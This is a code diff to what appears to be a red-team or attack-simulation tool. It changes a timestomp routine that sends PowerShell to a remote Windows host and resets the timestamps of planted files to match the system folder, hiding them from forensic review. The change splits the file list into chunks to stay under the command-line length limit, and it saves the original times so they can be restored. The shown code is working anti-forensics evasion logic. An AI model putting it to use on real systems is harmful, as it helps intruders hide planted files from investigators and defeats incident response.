@@ -9,6 +9,8 @@ from ..exec import winexec
 from .base import Result, can_root
 
 TIMEOUT = 90
+# Paths per timestomp round trip: keeps one PowerShell command well under the 8191-char cap.
+TIMESTOMP_CHUNK = 10
 
 SLEEP_CMD_BODY = "ping -n 600 127.0.0.1 >nul"
 SLEEP_CMDLINE = winexec.ps("Start-Sleep 600")
@@ -328,24 +330,27 @@ def timestomp(ctx, ip, fh, names):
     paths = _planted_paths(ctx, ip)
     if not paths:
         return Result(False, f"timestomp on {ip}: nothing planted to stamp")
-    ps = ("$r = (Get-Item $env:SystemRoot).CreationTime; $n = 0; "
-          f"foreach ($p in @({_array(paths)})) {{ "
-          "$i = Get-Item -Force $p -ErrorAction SilentlyContinue; "
-          "if ($i) { Write-Output ('TS|' + $p + '|' + $i.CreationTime.Ticks "
-          "+ '|' + $i.LastWriteTime.Ticks + '|' + $i.LastAccessTime.Ticks); "
-          "$i.CreationTime = $r; $i.LastWriteTime = $r; $i.LastAccessTime = $r; "
-          "$n++ } }; "
-          "if ($n -gt 0) { exit 0 } else { exit 1 }")
-    rc, out, err = _send(ctx, ip, fh, ps)
     stamped = []
-    for line in (out or "").splitlines():
-        if not line.startswith("TS|"):
-            continue
-        parts = line.split("|")
-        if len(parts) == 5:
-            stamped.append(parts[1:])
-    if rc != 0 or not stamped:
-        return Result(False, f"timestomp on {ip}: {_why(rc, out, err)}")
+    # A full plant is 40+ paths, and one script carrying all of them crossed Windows'
+    # 8191-char command line (live twice: "The command line is too long"). Chunk it.
+    for start in range(0, len(paths), TIMESTOMP_CHUNK):
+        chunk = paths[start:start + TIMESTOMP_CHUNK]
+        ps = ("$r = (Get-Item $env:SystemRoot).CreationTime; $n = 0; "
+              f"foreach ($p in @({_array(chunk)})) {{ "
+              "$i = Get-Item -Force $p -ErrorAction SilentlyContinue; "
+              "if ($i) { Write-Output ('TS|' + $p + '|' + $i.CreationTime.Ticks "
+              "+ '|' + $i.LastWriteTime.Ticks + '|' + $i.LastAccessTime.Ticks); "
+              "$i.CreationTime = $r; $i.LastWriteTime = $r; $i.LastAccessTime = $r; "
+              "$n++ } }; "
+              "if ($n -gt 0) { exit 0 } else { exit 1 }")
+        rc, out, err = _send(ctx, ip, fh, ps)
+        got = [line.split("|")[1:] for line in (out or "").splitlines()
+               if line.startswith("TS|") and len(line.split("|")) == 5]
+        if rc != 0 and not got:
+            return Result(False, f"timestomp on {ip}: {_why(rc, out, err)}")
+        stamped.extend(got)
+    if not stamped:
+        return Result(False, f"timestomp on {ip}: nothing stamped")
     recipe = []
     for path, created, written, accessed in stamped:
         recipe.append(f"(Get-Item '{path}').CreationTime = [datetime]::new({created})")
